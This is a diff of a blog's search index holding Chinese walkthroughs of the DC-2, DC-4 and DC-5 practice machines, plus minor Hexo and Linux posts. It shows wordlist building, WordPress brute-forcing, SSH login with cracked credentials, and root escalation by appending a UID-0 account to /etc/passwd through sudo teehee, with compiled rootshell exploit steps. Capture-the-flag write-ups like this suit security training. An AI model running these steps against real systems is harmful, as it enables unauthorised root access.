@@ -178,7 +178,7 @@
 <br/>
 
 <blockquote>
-<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#114;&#111;&#98;&#105;&#110;&#64;&#100;&#105;&#103;&#105;&#x2e;&#x6e;&#105;&#110;&#x6a;&#x61;">&#114;&#111;&#98;&#105;&#110;&#64;&#100;&#105;&#103;&#105;&#x2e;&#x6e;&#105;&#110;&#x6a;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
+<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#x6f;&#98;&#105;&#x6e;&#64;&#x64;&#105;&#103;&#x69;&#46;&#110;&#105;&#110;&#x6a;&#x61;">&#x72;&#x6f;&#98;&#105;&#x6e;&#64;&#x64;&#105;&#103;&#x69;&#46;&#110;&#105;&#110;&#x6a;&#x61;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
 <p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
 </blockquote>
 <p>使用wpscan爆破</p>
@@ -296,8 +296,8 @@
 <p>得到 <code>jim  jibril04</code></p>
 <p>连接ssh</p>
 <blockquote>
-<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#x69;&#x6d;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#53;">&#106;&#x69;&#x6d;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#x31;&#x38;&#46;&#49;&#x33;&#53;</a></strong></p>
-<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#106;&#105;&#x6d;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#x35;">&#106;&#105;&#x6d;&#64;&#49;&#x39;&#50;&#46;&#x31;&#54;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#x35;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p><strong>kali@kali2020:~/Tools$ ssh <a href="mailto:&#106;&#105;&#x6d;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;">&#106;&#105;&#x6d;&#64;&#49;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#49;&#x38;&#46;&#49;&#51;&#53;</a></strong></p>
+<p>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#x31;&#51;&#x35;">&#x6a;&#x69;&#x6d;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#x36;&#x38;&#46;&#x31;&#56;&#x2e;&#x31;&#51;&#x35;</a>‘s password:<br>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
 <p>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms for each program are described in the<br>individual files in /usr/share/doc/*/copyright.</p>
 <p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>You have mail.<br>Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100</p>
 <p><strong>jim@dc-4:~$ pwd</strong></p>
@@ -345,7 +345,7 @@
 <p>Mamor:x:0:0:::/bin/bash</p>
 <p><code>echo &quot;Mamor:x:0:0:::/bin/bash&quot; |sudo teehee -a /etc/passwd</code></p>
 <blockquote>
-<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#x4d;&#x61;&#109;&#111;&#x72;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#56;&#x2e;&#49;&#x33;&#53;">&#x4d;&#x61;&#109;&#111;&#x72;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#56;&#x2e;&#49;&#x33;&#53;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;">&#77;&#97;&#x6d;&#111;&#x72;&#x40;&#49;&#57;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#49;&#56;&#x2e;&#49;&#51;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#56;&#46;&#49;&#x33;&#x35;">&#77;&#97;&#x6d;&#x6f;&#114;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#54;&#x38;&#46;&#49;&#56;&#46;&#49;&#x33;&#x35;</a>‘s password: </p>
+<p>charles@dc-4:<del>$ echo “Mamor:x:0:0:::/bin/bash” |sudo teehee -a /etc/passwd<br>Mamor:x:0:0:::/bin/bash<br>charles@dc-4:\</del>$ ssh <a href="mailto:&#77;&#97;&#109;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x38;&#46;&#x31;&#51;&#x35;">&#77;&#97;&#109;&#x6f;&#114;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#49;&#x38;&#46;&#x31;&#51;&#x35;</a><br>The authenticity of host ‘192.168.18.135 (192.168.18.135)’ can’t be established.<br>ECDSA key fingerprint is SHA256:vtcgdCXO4d3KmnjiIIkH1Een5F1AiSx3qp0ABgwdvww.<br>Are you sure you want to continue connecting (yes/no)? yes<br>Warning: Permanently added ‘192.168.18.135’ (ECDSA) to the list of known hosts.<br><a href="mailto:&#x4d;&#97;&#x6d;&#x6f;&#114;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#53;">&#x4d;&#97;&#x6d;&#x6f;&#114;&#x40;&#x31;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#49;&#x38;&#46;&#x31;&#x33;&#53;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#x35;">&#77;&#97;&#x6d;&#x6f;&#x72;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#x31;&#x38;&#46;&#49;&#51;&#x35;</a>‘s password: </p>
 <p>charles@dc-4:~$ su Mamor<br>Password:<br>su: Authentication failure<br>charles@dc-4:~$ </p>
 </blockquote>
 <p>构造失败，重新构造一个</p>
@@ -462,7 +462,7 @@
 <p>编译</p>
 <p><code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></p>
 <p><code>gcc -o rootshell rootshell.c</code></p>
-<p>将第三部分保存为dc5.sh</p>
+<p>将第三部分保存为exp.sh</p>
 <br/>
 
 <br/>
@@ -653,11 +653,10 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo基本使用</title>
-    <url>/posts/d4fee3ae/</url>
-    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
-<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
-]]></content>
+    <title>hexo文章插入图片</title>
+    <url>/posts/7ecd88c4/</url>
+    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Hexo</category>
       </categories>
@@ -666,10 +665,11 @@
       </tags>
   </entry>
   <entry>
-    <title>hexo文章插入图片</title>
-    <url>/posts/7ecd88c4/</url>
-    <content><![CDATA[<h3 id="本地引用-采用相对路径"><a href="#本地引用-采用相对路径" class="headerlink" title="本地引用(采用相对路径)"></a>本地引用(采用相对路径)</h3><p>在 <code>config.yml</code>文件中配置，post_asset_folder设为true，当再次新建文章时，会在source/_post中生产和文章同名的文件夹，把需要的图片资源放入该文件夹，就可以使用相对路径来引用图片.</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">_posts/post_name/image.jpg</span><br><span class="line"></span><br><span class="line">![](image.jpg)</span><br><span class="line">![](image.png)</span><br></pre></td></tr></table></figure>]]></content>
+    <title>hexo基本使用</title>
+    <url>/posts/d4fee3ae/</url>
+    <content><![CDATA[<p><code>hexo g </code> == <code>hexo generate </code> #生产静态网页<br><code>hexo s </code> == <code>hexo server</code> #启动服务预览<br><code>hexo d</code> == <code>hexo deploy</code> #部署<br><code>hexo clean</code> #清除缓存</p>
+<h3 id="写文章"><a href="#写文章" class="headerlink" title="写文章"></a>写文章</h3><p><code>hexo new post “标题”</code>  新建一篇文章  然后会在_post目录下找到新增的.md文件，用此文件来存方所习得内容编写完markdown文件后，根目录下输入<code> hexo g</code>生产静态页面。输入<code>hexo s</code>本地预览效果，<code>hexo d</code>上传至GitHub</p>
+]]></content>
       <categories>
         <category>Hexo</category>
       </categories>
@@ -707,6 +707,18 @@
       </tags>
   </entry>
   <entry>
+    <title>kali安装pip2</title>
+    <url>/posts/6b338ac1/</url>
+    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>idea激活</title>
     <url>/posts/b49b0221/</url>
     <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
@@ -728,18 +740,6 @@
       </categories>
       <tags>
         <tag>phpstudy</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>kali安装pip2</title>
-    <url>/posts/6b338ac1/</url>
-    <content><![CDATA[<p><code>kali 安装pip2</code><br><code>wget https://bootstrap.pypa.io/pip/2.6/get-pip.py</code><br><code>sudo python2 get-pip.py</code><br><code>pip2 -V</code><br>升级版本<br><code>sudo pip2 install --upgrade pip</code></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
